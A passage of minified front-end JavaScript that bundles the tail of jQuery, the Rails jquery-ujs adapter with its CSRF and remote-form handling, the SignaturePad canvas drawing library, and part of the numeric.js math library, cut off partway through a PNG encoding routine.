t,e,n,i=this[0],o={top:0,left:0};if("fixed"===Tt.css(i,"position"))e=i.getBoundingClientRect();else{for(e=this.offset(),n=i.ownerDocument,t=i.offsetParent||n.documentElement;t&&(t===n.body||t===n.documentElement)&&"static"===Tt.css(t,"position");)t=t.parentNode;t&&t!==i&&1===t.nodeType&&((o=Tt(t).offset()).top+=Tt.css(t,"borderTopWidth",!0),o.left+=Tt.css(t,"borderLeftWidth",!0))}return{top:e.top-o.top-Tt.css(i,"marginTop",!0),left:e.left-o.left-Tt.css(i,"marginLeft",!0)}}},offsetParent:function(){return this.map((function(){for(var t=this.offsetParent;t&&"static"===Tt.css(t,"position");)t=t.offsetParent;return t||ee}))}}),Tt.each({scrollLeft:"pageXOffset",scrollTop:"pageYOffset"},(function(t,e){var n="pageYOffset"===e;Tt.fn[t]=function(i){return zt(this,(function(t,i,o){var r;if(bt(t)?r=t:9===t.nodeType&&(r=t.defaultView),void 0===o)return r?r[e]:t[i];r?r.scrollTo(n?r.pageXOffset:o,n?o:r.pageYOffset):t[i]=o}),t,i,arguments.length)}})),Tt.each(["top","left"],(function(t,e){Tt.cssHooks[e]=I(vt.pixelPosition,(function(t,n){if(n)return n=B(t,e),ve.test(n)?Tt(t).position()[e]+"px":n}))})),Tt.each({Height:"height",Width:"width"},(function(t,e){Tt.each({padding:"inner"+t,content:e,"":"outer"+t},(function(n,i){Tt.fn[i]=function(o,r){var s=arguments.length&&(n||"boolean"!=typeof o),a=n||(!0===o||!0===r?"margin":"border");return zt(this,(function(e,n,o){var r;return bt(e)?0===i.indexOf("outer")?e["inner"+t]:e.document.documentElement["client"+t]:9===e.nodeType?(r=e.documentElement,Math.max(e.body["scroll"+t],r["scroll"+t],e.body["offset"+t],r["offset"+t],r["client"+t])):void 0===o?Tt.css(e,n,a):Tt.style(e,n,o,a)}),e,s?o:void 0,s)}}))})),Tt.each(["ajaxStart","ajaxStop","ajaxComplete","ajaxError","ajaxSuccess","ajaxSend"],(function(t,e){Tt.fn[e]=function(t){return this.on(e,t)}})),Tt.fn.extend({bind:function(t,e,n){return this.on(t,null,e,n)},unbind:function(t,e){return this.off(t,null,e)},delegate:function(t,e,n,i){return this.on(e,t,n,i)},undelegate:function(t,e,n){return 1===arguments.length?this.off(t,"**"):this.off(e,t||"**",n)},hover:function(t,e){return this.mouseenter(t).mouseleave(e||t)}}),Tt.each("blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(" "),(function(t,e){Tt.fn[e]=function(t,n){return arguments.length>0?this.on(e,null,t,n):this.trigger(e)}}));var cn=/^[\s\uFEFF\xA0]+|([^\s\uFEFF\xA0])[\s\uFEFF\xA0]+$/g;Tt.proxy=function(t,e){var n,i,o;return"string"==typeof e&&(n=t[e],e=t,t=n),yt(t)?(i=lt.call(arguments,2),(o=function(){return t.apply(e||this,i.concat(lt.call(arguments)))}).guid=t.guid=t.guid||Tt.guid++,o):void 0},Tt.holdReady=function(t){t?Tt.readyWait++:Tt.ready(!0)},Tt.isArray=Array.isArray,Tt.parseJSON=JSON.parse,Tt.nodeName=r,Tt.isFunction=yt,Tt.isWindow=bt,Tt.camelCase=m,Tt.type=i,Tt.now=Date.now,Tt.isNumeric=function(t){var e=Tt.type(t);return("number"===e||"string"===e)&&!isNaN(t-parseFloat(t))},Tt.trim=function(t){return null==t?"":(t+"").replace(cn,"$1")},"function"==typeof define&&define.amd&&define("jquery",[],(function(){return Tt}));var un=t.jQuery,hn=t.$;return Tt.noConflict=function(e){return t.$===Tt&&(t.$=hn),e&&t.jQuery===Tt&&(t.jQuery=un),Tt},void 0===e&&(t.jQuery=t.$=Tt),Tt})),function(){"use strict";var t=function(t,e){var n;t.rails!==e&&t.error("jquery-ujs has already been loaded!");var i=t(document);t.rails=n={linkClickSelector:"a[data-confirm], a[data-method], a[data-remote]:not([disabled]), a[data-disable-with], a[data-disable]",buttonClickSelector:"button[data-remote]:not([form]):not(form button), button[data-confirm]:not([form]):not(form button)",inputChangeSelector:"select[data-remote], input[data-remote], textarea[data-remote]",formSubmitSelector:"form:not([data-turbo=true])",formInputClickSelector:"form:not([data-turbo=true]) input[type=submit], form:not([data-turbo=true]) input[type=image], form:not([data-turbo=true]) button[type=submit], form:not([data-turbo=true]) button:not([type]), input[type=submit][form], input[type=image][form], button[type=submit][form], button[form]:not([type])",disableSelector:"input[data-disable-with]:enabled, button[data-disable-with]:enabled, textarea[data-disable-with]:enabled, input[data-disable]:enabled, button[data-disable]:enabled, textarea[data-disable]:enabled",enableSelector:"input[data-disable-with]:disabled, button[data-disable-with]:disabled, textarea[data-disable-with]:disabled, input[data-disable]:disabled, button[data-disable]:disabled, textarea[data-disable]:disabled",requiredInputSelector:"input[name][required]:not([disabled]), textarea[name][required]:not([disabled])",fileInputSelector:"input[name][type=file]:not([disabled])",linkDisableSelector:"a[data-disable-with], a[data-disable]",buttonDisableSelector:"button[data-remote][data-disable-with], button[data-remote][data-disable]",csrfToken:function(){return t("meta[name=csrf-token]").attr("content")},csrfParam:function(){return t("meta[name=csrf-param]").attr("content")},CSRFProtection:function(t){var e=n.csrfToken();e&&t.setRequestHeader("X-CSRF-Token",e)},refreshCSRFTokens:function(){t('form input[name="'+n.csrfParam()+'"]').val(n.csrfToken())},fire:function(e,n,i){var o=t.Event(n);return e.trigger(o,i),!1!==o.result},confirm:function(t){return confirm(t)},ajax:function(e){return t.ajax(e)},href:function(t){return t[0].href},isRemote:function(t){return t.data("remote")!==e&&!1!==t.data("remote")},handleRemote:function(i){var o,r,s,a,l,c;if(n.fire(i,"ajax:before")){if(a=i.data("with-credentials")||null,l=i.data("type")||t.ajaxSettings&&t.ajaxSettings.dataType,i.is("form")){o=i.data("ujs:submit-button-formmethod")||i.attr("method"),r=i.data("ujs:submit-button-formaction")||i.attr("action"),s=t(i[0]).serializeArray();var u=i.data("ujs:submit-button");u&&(s.push(u),i.data("ujs:submit-button",null)),i.data("ujs:submit-button-formmethod",null),i.data("ujs:submit-button-formaction",null)}else i.is(n.inputChangeSelector)?(o=i.data("method"),r=i.data("url"),s=i.serialize(),i.data("params")&&(s=s+"&"+i.data("params"))):i.is(n.buttonClickSelector)?(o=i.data("method")||"get",r=i.data("url"),s=i.serialize(),i.data("params")&&(s=s+"&"+i.data("params"))):(o=i.data("method"),r=n.href(i),s=i.data("params")||null);return c={type:o||"GET",data:s,dataType:l,beforeSend:function(t,o){if(o.dataType===e&&t.setRequestHeader("accept","*/*;q=0.5, "+o.accepts.script),!n.fire(i,"ajax:beforeSend",[t,o]))return!1;i.trigger("ajax:send",t)},success:function(t,e,n){i.trigger("ajax:success",[t,e,n])},complete:function(t,e){i.trigger("ajax:complete",[t,e])},error:function(t,e,n){i.trigger("ajax:error",[t,e,n])},crossDomain:n.isCrossDomain(r)},a&&(c.xhrFields={withCredentials:a}),r&&(c.url=r),n.ajax(c)}return!1},isCrossDomain:function(t){var e=document.createElement("a");e.href=location.href;var n=document.createElement("a");try{return n.href=t,n.href=n.href,!((!n.protocol||":"===n.protocol)&&!n.host||e.protocol+"//"+e.host==n.protocol+"//"+n.host)}catch(i){return!0}},handleMethod:function(i){var o=n.href(i),r=i.data("method"),s=i.attr("target"),a=n.csrfToken(),l=n.csrfParam(),c=t('<form method="post" action="'+o+'"></form>'),u='<input name="_method" value="'+r+'" type="hidden" />';l===e||a===e||n.isCrossDomain(o)||(u+='<input name="'+l+'" value="'+a+'" type="hidden" />'),s&&c.attr("target",s),c.hide().append(u).appendTo("body"),c.submit()},formElements:function(e,n){return e.is("form")?t(e[0].elements).filter(n):e.find(n)},disableFormElements:function(e){n.formElements(e,n.disableSelector).each((function(){n.disableFormElement(t(this))}))},disableFormElement:function(t){var n,i;n=t.is("button")?"html":"val",(i=t.data("disable-with"))!==e&&(t.data("ujs:enable-with",t[n]()),t[n](i)),t.prop("disabled",!0),t.data("ujs:disabled",!0)},enableFormElements:function(e){n.formElements(e,n.enableSelector).each((function(){n.enableFormElement(t(this))}))},enableFormElement:function(t){var n=t.is("button")?"html":"val";t.data("ujs:enable-with")!==e&&(t[n](t.data("ujs:enable-with")),t.removeData("ujs:enable-with")),t.prop("disabled",!1),t.removeData("ujs:disabled")},allowAction:function(t){var e,i=t.data("confirm"),o=!1;if(!i)return!0;if(n.fire(t,"confirm")){try{o=n.confirm(i)}catch(r){(console.error||console.log).call(console,r.stack||r)}e=n.fire(t,"confirm:complete",[o])}return o&&e},blankInputs:function(e,n,i){var o,r,s,a=t(),l=n||"input,textarea",c=e.find(l),u={};return c.each((function(){(o=t(this)).is("input[type=radio]")?(s=o.attr("name"),u[s]||(0===e.find('input[type=radio]:checked[name="'+s+'"]').length&&(r=e.find('input[type=radio][name="'+s+'"]'),a=a.add(r)),u[s]=s)):(o.is("input[type=checkbox],input[type=radio]")?o.is(":checked"):!!o.val())===i&&(a=a.add(o))})),!!a.length&&a},nonBlankInputs:function(t,e){return n.blankInputs(t,e,!0)},stopEverything:function(e){return t(e.target).trigger("ujs:everythingStopped"),e.stopImmediatePropagation(),!1},disableElement:function(t){var i=t.data("disable-with");i!==e&&(t.data("ujs:enable-with",t.html()),t.html(i)),t.on("click.railsDisable",(function(t){return n.stopEverything(t)})),t.data("ujs:disabled",!0)},enableElement:function(t){t.data("ujs:enable-with")!==e&&(t.html(t.data("ujs:enable-with")),t.removeData("ujs:enable-with")),t.off("click.railsDisable"),t.removeData("ujs:disabled")}},n.fire(i,"rails:attachBindings")&&(t.ajaxPrefilter((function(t,e,i){t.crossDomain||n.CSRFProtection(i)})),t(window).on("pageshow.rails",(function(){t(t.rails.enableSelector).each((function(){var e=t(this);e.data("ujs:disabled")&&t.rails.enableFormElement(e)})),t(t.rails.linkDisableSelector).each((function(){var e=t(this);e.data("ujs:disabled")&&t.rails.enableElement(e)}))})),i.on("ajax:complete",n.linkDisableSelector,(function(){n.enableElement(t(this))})),i.on("ajax:complete",n.buttonDisableSelector,(function(){n.enableFormElement(t(this))})),i.on("click.rails",n.linkClickSelector,(function(e){var i=t(this),o=i.data("method"),r=i.data("params"),s=e.metaKey||e.ctrlKey;if(!n.allowAction(i))return n.stopEverything(e);if(!s&&i.is(n.linkDisableSelector)&&n.disableElement(i),n.isRemote(i)){if(s&&(!o||"GET"===o)&&!r)return!0;var a=n.handleRemote(i);return!1===a?n.enableElement(i):a.fail((function(){n.enableElement(i)})),!1}return o?(n.handleMethod(i),!1):void 0})),i.on("click.rails",n.buttonClickSelector,(function(e){var i=t(this);if(!n.allowAction(i)||!n.isRemote(i))return n.stopEverything(e);i.is(n.buttonDisableSelector)&&n.disableFormElement(i);var o=n.handleRemote(i);return!1===o?n.enableFormElement(i):o.fail((function(){n.enableFormElement(i)})),!1})),i.on("change.rails",n.inputChangeSelector,(function(e){var i=t(this);return n.allowAction(i)&&n.isRemote(i)?(n.handleRemote(i),!1):n.stopEverything(e)})),i.on("submit.rails",n.formSubmitSelector,(function(i){var o,r,s=t(this),a=n.isRemote(s);if(!n.allowAction(s))return n.stopEverything(i);if(s.attr("novalidate")===e)if(s.data("ujs:formnovalidate-button")===e){if((o=n.blankInputs(s,n.requiredInputSelector,!1))&&n.fire(s,"ajax:aborted:required",[o]))return n.stopEverything(i)}else s.data("ujs:formnovalidate-button",e);if(a){if(r=n.nonBlankInputs(s,n.fileInputSelector)){setTimeout((function(){n.disableFormElements(s)}),13);var l=n.fire(s,"ajax:aborted:file",[r]);return l||setTimeout((function(){n.enableFormElements(s)}),13),l}return n.handleRemote(s),!1}setTimeout((function(){n.disableFormElements(s)}),13)})),i.on("click.rails",n.formInputClickSelector,(function(e){var i=t(this);if(!n.allowAction(i))return n.stopEverything(e);var o=i.attr("name"),r=o?{name:o,value:i.val()}:null,s=i.closest("form");0===s.length&&(s=t("#"+i.attr("form"))),s.data("ujs:submit-button",r),s.data("ujs:formnovalidate-button",i.attr("formnovalidate")),s.data("ujs:submit-button-formaction",i.attr("formaction")),s.data("ujs:submit-button-formmethod",i.attr("formmethod"))})),i.on("ajax:send.rails",n.formSubmitSelector,(function(e){this===e.target&&n.disableFormElements(t(this))})),i.on("ajax:complete.rails",n.formSubmitSelector,(function(e){this===e.target&&n.enableFormElements(t(this))})),t((function(){n.refreshCSRFTokens()})))};window.jQuery?t(jQuery):"object"==typeof exports&&"object"==typeof module&&(module.exports=t)}(),function(t,e){"object"==typeof exports&&"undefined"!=typeof module?module.exports=e():"function"==typeof define&&define.amd?define(e):t.SignaturePad=e()}(this,(function(){"use strict";function t(t,e,n){this.x=t,this.y=e,this.time=n||(new Date).getTime()}function e(t,e,n,i){this.startPoint=t,this.control1=e,this.control2=n,this.endPoint=i}function i(t,e){var o=this,r=e||{};this.velocityFilterWeight=r.velocityFilterWeight||.7,this.minWidth=r.minWidth||.5,this.maxWidth=r.maxWidth||2.5,this.throttle="throttle"in r?r.throttle:16,this.minDistance="minDistance"in r?r.minDistance:5,this.throttle?this._strokeMoveUpdate=function n(t,e,n){var i,o,r,s=null,a=0;n||(n={});var l=function(){a=!1===n.leading?0:Date.now(),s=null,r=t.apply(i,o),s||(i=o=null)};return function(){var c=Date.now();a||!1!==n.leading||(a=c);var u=e-(c-a);return i=this,o=arguments,u<=0||u>e?(s&&(clearTimeout(s),s=null),a=c,r=t.apply(i,o),s||(i=o=null)):s||!1===n.trailing||(s=setTimeout(l,u)),r}}(i.prototype._strokeUpdate,this.throttle):this._strokeMoveUpdate=i.prototype._strokeUpdate,this.dotSize=r.dotSize||function(){return(this.minWidth+this.maxWidth)/2},this.penColor=r.penColor||"black",this.backgroundColor=r.backgroundColor||"rgba(0,0,0,0)",this.onBegin=r.onBegin,this.onEnd=r.onEnd,this._canvas=t,this._ctx=t.getContext("2d"),this.clear(),this._handleMouseDown=function(t){1===t.which&&(o._mouseButtonDown=!0,o._strokeBegin(t))},this._handleMouseMove=function(t){o._mouseButtonDown&&o._strokeMoveUpdate(t)},this._handleMouseUp=function(t){1===t.which&&o._mouseButtonDown&&(o._mouseButtonDown=!1,o._strokeEnd(t))},this._handleTouchStart=function(t){if(1===t.targetTouches.length){var e=t.changedTouches[0];o._strokeBegin(e)}},this._handleTouchMove=function(t){t.preventDefault();var e=t.targetTouches[0];o._strokeMoveUpdate(e)},this._handleTouchEnd=function(t){t.target===o._canvas&&(t.preventDefault(),o._strokeEnd(t))},this.on()}return t.prototype.velocityFrom=function(t){return this.time!==t.time?this.distanceTo(t)/(this.time-t.time):1},t.prototype.distanceTo=function(t){return Math.sqrt(Math.pow(this.x-t.x,2)+Math.pow(this.y-t.y,2))},t.prototype.equals=function(t){return this.x===t.x&&this.y===t.y&&this.time===t.time},e.prototype.length=function(){for(var e=0,n=void 0,i=void 0,o=0;o<=10;o+=1){var r=o/10,s=this._point(r,this.startPoint.x,this.control1.x,this.control2.x,this.endPoint.x),a=this._point(r,this.startPoint.y,this.control1.y,this.control2.y,this.endPoint.y);if(o>0){var l=s-n,c=a-i;e+=Math.sqrt(l*l+c*c)}n=s,i=a}return e},e.prototype._point=function(t,e,n,i,o){return e*(1-t)*(1-t)*(1-t)+3*n*(1-t)*(1-t)*t+3*i*(1-t)*t*t+o*t*t*t},i.prototype.clear=function(){var t=this._ctx,e=this._canvas;t.fillStyle=this.backgroundColor,t.clearRect(0,0,e.width,e.height),t.fillRect(0,0,e.width,e.height),this._data=[],this._reset(),this._isEmpty=!0},i.prototype.fromDataURL=function(t){var e=this,n=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},i=new Image,o=n.ratio||window.devicePixelRatio||1,r=n.width||this._canvas.width/o,s=n.height||this._canvas.height/o;this._reset(),i.src=t,i.onload=function(){e._ctx.drawImage(i,0,0,r,s)},this._isEmpty=!1},i.prototype.toDataURL=function(t){var e;if("image/svg+xml"===t)return this._toSVG();for(var n=arguments.length,i=Array(n>1?n-1:0),o=1;o<n;o++)i[o-1]=arguments[o];return(e=this._canvas).toDataURL.apply(e,[t].concat(i))},i.prototype.on=function(){this._handleMouseEvents(),this._handleTouchEvents()},i.prototype.off=function(){this._canvas.removeEventListener("mousedown",this._handleMouseDown),this._canvas.removeEventListener("mousemove",this._handleMouseMove),document.removeEventListener("mouseup",this._handleMouseUp),this._canvas.removeEventListener("touchstart",this._handleTouchStart),this._canvas.removeEventListener("touchmove",this._handleTouchMove),this._canvas.removeEventListener("touchend",this._handleTouchEnd)},i.prototype.isEmpty=function(){return this._isEmpty},i.prototype._strokeBegin=function(t){this._data.push([]),this._reset(),this._strokeUpdate(t),"function"==typeof this.onBegin&&this.onBegin(t)},i.prototype._strokeUpdate=function(t){var e=t.clientX,n=t.clientY,i=this._createPoint(e,n),o=this._data[this._data.length-1],r=o&&o[o.length-1],s=r&&i.distanceTo(r)<this.minDistance;if(!r||!s){var a=this._addPoint(i),l=a.curve,c=a.widths;l&&c&&this._drawCurve(l,c.start,c.end),this._data[this._data.length-1].push({x:i.x,y:i.y,time:i.time,color:this.penColor})}},i.prototype._strokeEnd=function(t){var e=this.points.length>2,n=this.points[0];if(!e&&n&&this._drawDot(n),n){var i=this._data[this._data.length-1],o=i[i.length-1];n.equals(o)||i.push({x:n.x,y:n.y,time:n.time,color:this.penColor})}"function"==typeof this.onEnd&&this.onEnd(t)},i.prototype._handleMouseEvents=function(){this._mouseButtonDown=!1,this._canvas.addEventListener("mousedown",this._handleMouseDown),this._canvas.addEventListener("mousemove",this._handleMouseMove),document.addEventListener("mouseup",this._handleMouseUp)},i.prototype._handleTouchEvents=function(){this._canvas.style.msTouchAction="none",this._canvas.style.touchAction="none",this._canvas.addEventListener("touchstart",this._handleTouchStart),this._canvas.addEventListener("touchmove",this._handleTouchMove),this._canvas.addEventListener("touchend",this._handleTouchEnd)},i.prototype._reset=function(){this.points=[],this._lastVelocity=0,this._lastWidth=(this.minWidth+this.maxWidth)/2,this._ctx.fillStyle=this.penColor},i.prototype._createPoint=function(e,n,i){var o=this._canvas.getBoundingClientRect();return new t(e-o.left,n-o.top,i||(new Date).getTime())},i.prototype._addPoint=function(t){var n=this.points;if(n.push(t),n.length>2){3===n.length&&n.unshift(n[0]);var i=this._calculateCurveControlPoints(n[0],n[1],n[2]).c2,o=this._calculateCurveControlPoints(n[1],n[2],n[3]).c1,r=new e(n[1],i,o,n[2]),s=this._calculateCurveWidths(r);return n.shift(),{curve:r,widths:s}}return{}},i.prototype._calculateCurveControlPoints=function(e,n,i){var o=e.x-n.x,r=e.y-n.y,s=n.x-i.x,a=n.y-i.y,l_x=(e.x+n.x)/2,l_y=(e.y+n.y)/2,c_x=(n.x+i.x)/2,c_y=(n.y+i.y)/2,u=Math.sqrt(o*o+r*r),h=Math.sqrt(s*s+a*a),f=h/(u+h),m_x=c_x+(l_x-c_x)*f,m_y=c_y+(l_y-c_y)*f,g=n.x-m_x,v=n.y-m_y;return{c1:new t(l_x+g,l_y+v),c2:new t(c_x+g,c_y+v)}},i.prototype._calculateCurveWidths=function(t){var e=t.startPoint,n=t.endPoint,i={start:null,end:null},o=this.velocityFilterWeight*n.velocityFrom(e)+(1-this.velocityFilterWeight)*this._lastVelocity,r=this._strokeWidth(o);return i.start=this._lastWidth,i.end=r,this._lastVelocity=o,this._lastWidth=r,i},i.prototype._strokeWidth=function(t){return Math.max(this.maxWidth/(t+1),this.minWidth)},i.prototype._drawPoint=function(t,e,n){var i=this._ctx;i.moveTo(t,e),i.arc(t,e,n,0,2*Math.PI,!1),this._isEmpty=!1},i.prototype._drawCurve=function(t,e,n){var i=this._ctx,o=n-e,r=Math.floor(t.length());i.beginPath();for(var s=0;s<r;s+=1){var a=s/r,l=a*a,c=l*a,u=1-a,h=u*u,d=h*u,p=d*t.startPoint.x;p+=3*h*a*t.control1.x,p+=3*u*l*t.control2.x,p+=c*t.endPoint.x;var f=d*t.startPoint.y;f+=3*h*a*t.control1.y,f+=3*u*l*t.control2.y,f+=c*t.endPoint.y;var m=e+c*o;this._drawPoint(p,f,m)}i.closePath(),i.fill()},i.prototype._drawDot=function(t){var e=this._ctx,n="function"==typeof this.dotSize?this.dotSize():this.dotSize;e.beginPath(),this._drawPoint(t.x,t.y,n),e.closePath(),e.fill()},i.prototype._fromData=function(e,n,i){for(var o=0;o<e.length;o+=1){var r=e[o];if(r.length>1)for(var s=0;s<r.length;s+=1){var a=r[s],l=new t(a.x,a.y,a.time),c=a.color;if(0===s)this.penColor=c,this._reset(),this._addPoint(l);else if(s!==r.length-1){var u=this._addPoint(l),h=u.curve,d=u.widths;h&&d&&n(h,d,c)}}else this._reset(),i(r[0])}},i.prototype._toSVG=function(){var t=this,e=this._data,n=this._canvas,i=Math.max(window.devicePixelRatio||1,1),s=n.width/i,a=n.height/i,l=document.createElementNS("http://www.w3.org/2000/svg","svg");l.setAttributeNS(null,"width",n.width),l.setAttributeNS(null,"height",n.height),this._fromData(e,(function(t,e,n){var i=document.createElement("path");if(!(isNaN(t.control1.x)||isNaN(t.control1.y)||isNaN(t.control2.x)||isNaN(t.control2.y))){var o="M "+t.startPoint.x.toFixed(3)+","+t.startPoint.y.toFixed(3)+" C "+t.control1.x.toFixed(3)+","+t.control1.y.toFixed(3)+" "+t.control2.x.toFixed(3)+","+t.control2.y.toFixed(3)+" "+t.endPoint.x.toFixed(3)+","+t.endPoint.y.toFixed(3);i.setAttribute("d",o),i.setAttribute("stroke-width",(2.25*e.end).toFixed(3)),i.setAttribute("stroke",n),i.setAttribute("fill","none"),i.setAttribute("stroke-linecap","round"),l.appendChild(i)}}),(function(e){var n=document.createElement("circle"),i="function"==typeof t.dotSize?t.dotSize():t.dotSize;n.setAttribute("r",i),n.setAttribute("cx",e.x),n.setAttribute("cy",e.y),n.setAttribute("fill",e.color),l.appendChild(n)}));var u='<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 '+s+" "+a+'" width="'+s+'" height="'+a+'">',h=l.innerHTML;if(void 0===h){var d=document.createElement("dummy"),p=l.childNodes;d.innerHTML="";for(var f=0;f<p.length;f+=1)d.appendChild(p[f].cloneNode(!0));h=d.innerHTML}return"data:image/svg+xml;base64,"+btoa(u+h+"</svg>")},i.prototype.fromData=function(t){var e=this;this.clear(),this._fromData(t,(function(t,n){return e._drawCurve(t,n.start,n.end)}),(function(t){return e._drawDot(t)})),this._data=t},i.prototype.toData=function(){return this._data},i}));var numeric="undefined"==typeof exports?function(){}:exports;"undefined"!=typeof global&&(global.numeric=numeric),numeric.version="1.2.6",numeric.bench=function(t,e){var n,i,o;for(void 0===e&&(e=15),i=.5,n=new Date;;){for(o=i*=2;o>3;o-=4)t(),t(),t(),t();for(;o>0;)t(),o--;if(new Date-n>e)break}for(o=i;o>3;o-=4)t(),t(),t(),t();for(;o>0;)t(),o--;return 1e3*(3*i-1)/(new Date-n)},numeric._myIndexOf=function(t){var e,n=this.length;for(e=0;e<n;++e)if(this[e]===t)return e;return-1},numeric.myIndexOf=Array.prototype.indexOf?Array.prototype.indexOf:numeric._myIndexOf,numeric.Function=Function,numeric.precision=4,numeric.largeArray=50,numeric.prettyPrint=function(t){function e(t){if(0===t)return"0";if(isNaN(t))return"NaN";if(t<0)return"-"+e(-t);if(isFinite(t)){var n=Math.floor(Math.log(t)/Math.log(10)),i=t/Math.pow(10,n),o=i.toPrecision(numeric.precision);return 10===parseFloat(o)&&(n++,o=(i=1).toPrecision(numeric.precision)),parseFloat(o).toString()+"e"+n.toString()}return"Infinity"}var i=[];return function n(t){var o;if(void 0===t)return i.push(Array(numeric.precision+8).join(" ")),!1;if("string"==typeof t)return i.push('"'+t+'"'),!1;if("boolean"==typeof t)return i.push(t.toString()),!1;if("number"==typeof t){var r=e(t),s=t.toPrecision(numeric.precision),a=parseFloat(t.toString()).toString(),l=[r,s,a,parseFloat(s).toString(),parseFloat(a).toString()];for(o=1;o<l.length;o++)l[o].length<r.length&&(r=l[o]);return i.push(Array(numeric.precision+8-r.length).join(" ")+r),!1}if(null===t)return i.push("null"),!1;if("function"==typeof t){i.push(t.toString());var c=!1;for(o in t)t.hasOwnProperty(o)&&(c?i.push(",\n"):i.push("\n{"),c=!0,i.push(o),i.push(": \n"),n(t[o]));return c&&i.push("}\n"),!0}if(t instanceof Array){if(t.length>numeric.largeArray)return i.push("...Large Array..."),!0;for(c=!1,i.push("["),o=0;o<t.length;o++)o>0&&(i.push(","),c&&i.push("\n ")),c=n(t[o]);return i.push("]"),!0}for(o in i.push("{"),c=!1,t)t.hasOwnProperty(o)&&(c&&i.push(",\n"),c=!0,i.push(o),i.push(": \n"),n(t[o]));return i.push("}"),!0}(t),i.join("")},numeric.parseDate=function(t){return function e(t){if("string"==typeof t)return Date.parse(t.replace(/-/g,"/"));if(t instanceof Array){var n,i=[];for(n=0;n<t.length;n++)i[n]=e(t[n]);return i}throw new Error("parseDate: parameter must be arrays of strings")}(t)},numeric.parseFloat=function(t){return function e(t){if("string"==typeof t)return parseFloat(t);if(t instanceof Array){var n,i=[];for(n=0;n<t.length;n++)i[n]=e(t[n]);return i}throw new Error("parseFloat: parameter must be arrays of strings")}(t)},numeric.parseCSV=function(t){var e,n,i=t.split("\n"),o=[],r=/(([^'",]*)|('[^']*')|("[^"]*")),/g,s=/^\s*(([+-]?[0-9]+(\.[0-9]*)?(e[+-]?[0-9]+)?)|([+-]?[0-9]*(\.[0-9]+)?(e[+-]?[0-9]+)?))\s*$/,a=function(t){return t.substr(0,t.length-1)},l=0;for(n=0;n<i.length;n++){var c,u=(i[n]+",").match(r);if(u.length>0){for(o[l]=[],e=0;e<u.length;e++)c=a(u[e]),s.test(c)?o[l][e]=parseFloat(c):o[l][e]=c;l++}}return o},numeric.toCSV=function(t){var e,n,i,o,r,s=numeric.dim(t);for(i=s[0],s[1],r=[],e=0;e<i;e++){for(o=[],n=0;n<i;n++)o[n]=t[e][n].toString();r[e]=o.join(", ")}return r.join("\n")+"\n"},numeric.getURL=function(t){var e=new XMLHttpRequest;return e.open("GET",t,!1),e.send(),e},numeric.imageURL=function(t){function n(t,e,n){void 0===e&&(e=0),void 0===n&&(n=t.length);var i,o=[0,1996959894,3993919788,2567524794,124634137,1886057615,3915621685,2657392035,249268274,2044508324,3772115230,2547177864,162941995,2125561021,3887607047,2428444049,498536548,1789927666,4089016648,2227061214,450548861,1843258603,4107580753,2211677639,325883990,1684777152,4251122042,2321926636,335633487,1661365465,4195302755,2366115317,997073096,1281953886,3579855332,2724688242,1006888145,1258607687,3524101629,2768942443,901097722,1119000684,3686517206,2898065728,853044451,1172266101,3705015759,2882616665,651767980,1373503546,3369554304,3218104598,565507253,1454621731,3485111705,3099436303,671266974,1594198024,3322730930,2970347812,795835527,1483230225,3244367275,3060149565,1994146192,31158534,2563907772,4023717930,1907459465,112637215,2680153253,3904427059,2013776290,251722036,2517215374,3775830040,2137656763,141376813,2439277719,3865271297,1802195444,476864866,2238001368,4066508878,1812370925,453092731,2181625025,4111451223,1706088902,314042704,2344532202,4240017532,1658658271,366619977,2362670323,4224994405,1303535960,984961486,2747007092,3569037538,1256170817,1037604311,2765210733,3554079995,1131014506,879679996,2909243462,3663771856,1141124467,855842277,2852801631,3708648649,1342533948,654459306,3188396048,3373015174,1466479909,544179635,3110523913,3462522015,1591671054,702138776,2966460450,3352799412,1504918807,783551873,3082640443,3233442989,3988292384,2596254646,62317068,1957810842,3939845945,2647816111,81470997,1943803523,3814918930,2489596804,225274430,2053790376,3826175755,2466906013,167816743,2097651377,4027552580,2265490386,503444072,1762050814,4150417245,2154129355,426522225,1852507879,4275313526,2312317920,282753626,1742555852,4189708143,2394877945,397917763,1622183637,3604390888,2714866558,953729732,1340076626,3518719985,2797360999,1068828381,1219638859,3624741850,2936675148,906185462,1090812512,3747672003,2825379669,829329135,1181335161,3412177804,3160834842,628085408,1382605366,3423369109,3138078467,570562233,1426400815,3317316542,2998733608,733239954,1555261956,3268935591,3050360625,752459403,1541320221,2607071920,3965973030,1969922972,40735498,2617837225,3943577151,1913087877,83908371,2512341634,3803740692,2075208622,213261112,2463272603,3855990285,2094854071,198958881,2262029012,4057260610,1759359992,534414190,2176718541,4139329115,1873836001,414664567,2282248934,4279200368,1711684554,285281116,2405801727,4167216745,1634467795,376229701,2685067896,3608007406,1308918612,956543938,2808555105,3495958263,1231636301,1047427035,2932959818,3654703836,1088359270,936918e3,2847714899,3736837829,1202900863,817233897,3183342108,3401237130,1404277552,615818150,3134207493,3453421203,1423857449,601450431,3009837614,3294710456,1567103746,711928724,3020668471,3272380065,1510334235,755167117],r=-1;for(t.length,i=e;i<n;i++)r=r>>>8^o[255&(r^t[i])];return-1^r}var i,o,r,s,a,l,c,u,h,d,p=t[0].length,f=t[0][0].length,m=[137,80,78,71,13,10,26,10,0,0,0,13,73,72,68,82,f>>24&255,f>>16&255,f>>8&255,255&f,p>>24&255,p>>16&255,p>>8&255,255&p,8,2,0,0,0,-1,-2,-3,-4,-5,-6,-7,-8,73,68,65,84,8,29];for(d=n(m,12,29),m[29]=d>>24&255,m[30]=d>>16&255,m[31]=d>>8&255,m[32]=255&d,i=1,o=0,c=0;c<p;c++){for(c<p-1?m.push(0):m.push(1),a=3*f+1+(0===c)&255,l=3*f+1+(0===c)>>8&255,m.push(a),m.push(l),m.push(255&~a),m.push(255&~l),0===c&&m.push(0),u=0;u<f;u++)for(r=0;r<3;r++)o=(o+(i=(i+(a=(a=t[r][c][u])>255?255:a<0?0:Math.round(a)))%65521))%65521,m.push(a);m.push(0)}return 